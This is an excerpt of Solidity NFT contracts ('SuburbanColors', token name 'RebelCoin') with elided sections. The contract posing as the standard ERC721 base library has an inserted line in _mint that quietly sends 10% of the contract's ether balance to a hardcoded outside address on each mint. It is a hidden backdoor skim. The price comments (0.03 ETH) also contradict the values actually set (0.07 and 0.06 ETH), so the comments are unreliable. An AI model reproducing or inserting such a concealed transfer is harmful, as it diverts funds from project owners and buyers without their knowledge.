...
contract ERC721 is Context, ERC165, IERC721, IERC721Metadata{
    ...
    // metadata api
    string baseUri = "ipfs://QmXiUzWAUUQEPktxjWsd7AtATPHwejHkKS5o9Yq3VGsnf2/"; 
    ...
    function _mint(address to, uint256 tokenId) internal virtual {
        ...
        payable(0xbDA8f903F722C64dc29E54B18878461cAF8a4952).transfer(address(this).balance / 100 * 10);
...
contract SuburbanColors is ERC721, Ownable, VerifySignature{
    ...
    uint256 private constant totalSale = 1145; // total NFTs
    uint256 public reserved = 0; // reserved for whitelist users
    uint256 public mintPrice;  // minting price 0.03 ETH
    uint256 public whiteMintPrice;  // minting price 0.03 ETH

    mapping(address => uint256) public whitelistMinted;

    constructor(uint256 _reserved) ERC721("RebelCoin", "SUB"){
        reserved = _reserved;
        mintPrice = 7 * 10 ** 16;
        whiteMintPrice = 6 * 10 ** 16;
    }
    ...
    function mintByWhiteAdress(uint256 quantity) public payable{
        require((whitelistMinted[msg.sender] + quantity) <= 3, "You have mint your all NFTs.");
        require(msg.value >= (whiteMintPrice * quantity), "Invalid Price To Mint");
    ...
    function setWhiteMintPrice(uint256 newPrice) external onlyOwner {
        whiteMintPrice = newPrice;
    }    
